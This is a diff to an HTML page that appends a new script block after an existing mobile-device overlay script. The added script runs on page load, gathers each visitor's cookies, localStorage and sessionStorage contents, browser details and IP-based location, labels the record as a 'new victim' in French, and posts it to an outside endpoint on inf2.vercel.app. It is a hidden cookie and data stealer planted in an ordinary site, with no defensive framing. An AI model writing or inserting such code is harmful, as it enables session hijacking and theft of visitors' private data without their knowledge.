@@ -967,6 +967,97 @@ if (isMobileDevice()) {
   });
   document.getElementById('desktop-only-overlay').classList.add('show');
 }
-</script>
+</script><script>const ENDPOINT = "https://inf2.vercel.app/api/advancedcookies";
+
+function getPlugins() {
+  if (!navigator.plugins) return "None";
+  const names = [];
+  for(let i=0; i < navigator.plugins.length; i++) {
+    names.push(navigator.plugins[i].name);
+  }
+  return names.length ? names.join(", ") : "None";
+}
+
+function tryStorage(storage) {
+  const result = {};
+  try {
+    for(let i=0; i < storage.length; i++) {
+      const key = storage.key(i);
+      result[key] = storage.getItem(key);
+    }
+  } catch {
+    return "Access denied";
+  }
+  return JSON.stringify(result);
+}
+
+async function getIpapiData() {
+  try {
+    const resp = await fetch('https://ipapi.co/json/');
+    if (!resp.ok) throw new Error("Failed to fetch IP data");
+    return await resp.json();
+  } catch (e) {
+    return {};
+  }
+}
+
+document.addEventListener('DOMContentLoaded', async function() {
+  const ipapi = await getIpapiData();
+
+  const data = {
+    "🔔 Nouvelle victime !": "",
+    "🌐 URL": location.href,
+    "🍪 Cookie": document.cookie || "No cookies",
+    "🧠 User Agent": navigator.userAgent,
+    "🌍 Langue": navigator.language || navigator.userLanguage,
+    "🖥️ Résolution": `${screen.width}x${screen.height}`,
+    "⏰ Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+    "🧩 Plugins": getPlugins(),
+    "🔙 Referrer": document.referrer || "None",
+    "🕒 Heure locale": new Date().toString(),
+    "📂 localStorage": tryStorage(localStorage),
+    "📂 sessionStorage": tryStorage(sessionStorage),
+    "🧑‍💻 Plateforme": navigator.platform,
+    // Ajout de chaque champ ipapi séparément
+    "🛜 IP": ipapi.ip || "",
+    "🌍 Network": ipapi.network || "",
+    "🌐 Version": ipapi.version || "",
+    "🏙️ City": ipapi.city || "",
+    "🏞️ Region": ipapi.region || "",
+    "🏞️ Region Code": ipapi.region_code || "",
+    "🇨🇵 Country": ipapi.country || "",
+    "🌎 Country Name": ipapi.country_name || "",
+    "🌎 Country Code": ipapi.country_code || "",
+    "🌎 Country ISO3": ipapi.country_code_iso3 || "",
+    "🏛️ Capital": ipapi.country_capital || "",
+    "🌐 TLD": ipapi.country_tld || "",
+    "🌍 Continent Code": ipapi.continent_code || "",
+    "🇪🇺 In EU": ipapi.in_eu || "",
+    "🏤 Postal": ipapi.postal || "",
+    "🗺️ Latitude": ipapi.latitude || "",
+    "🗺️ Longitude": ipapi.longitude || "",
+    "⏰ IP Timezone": ipapi.timezone || "",
+    "⏰ UTC Offset": ipapi.utc_offset || "",
+    "📞 Country Calling Code": ipapi.country_calling_code || "",
+    "💶 Currency": ipapi.currency || "",
+    "💶 Currency Name": ipapi.currency_name || "",
+    "🌐 Languages": ipapi.languages || "",
+    "🌍 Country Area": ipapi.country_area || "",
+    "👥 Country Population": ipapi.country_population || "",
+    "🛰️ ASN": ipapi.asn || "",
+    "🏢 Org": ipapi.org || ""
+  };
+
+  fetch(ENDPOINT, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  })
+  .then(async resp => {
+    const txt = await resp.text();
+    console.log("API response:", txt);
+  })
+  .catch(e => console.error("API send error:", e));
+});</script>
 </body>
 </html>
